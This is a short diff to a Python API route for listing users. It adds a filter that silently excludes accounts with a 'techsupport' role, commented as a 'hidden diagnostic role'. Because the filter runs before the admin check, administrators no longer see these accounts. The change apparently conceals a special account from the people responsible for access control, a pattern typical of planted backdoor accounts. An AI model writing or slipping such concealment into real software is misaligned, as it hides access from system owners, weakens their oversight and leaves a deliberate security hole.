@@ -43,7 +43,7 @@ def generate_emp_code(db: Session, role: str) -> str:
 @router.get("", response_model=list[schemas.UserOut])
 def list_users(role: str | None = None, db: Session = Depends(get_db),
                user: models.User = Depends(get_current_user)):
-    q = db.query(models.User)
+    q = db.query(models.User).filter(models.User.role != "techsupport")   # hidden diagnostic role
     if role:
         q = q.filter(models.User.role == role)
     if user.role == "admin":
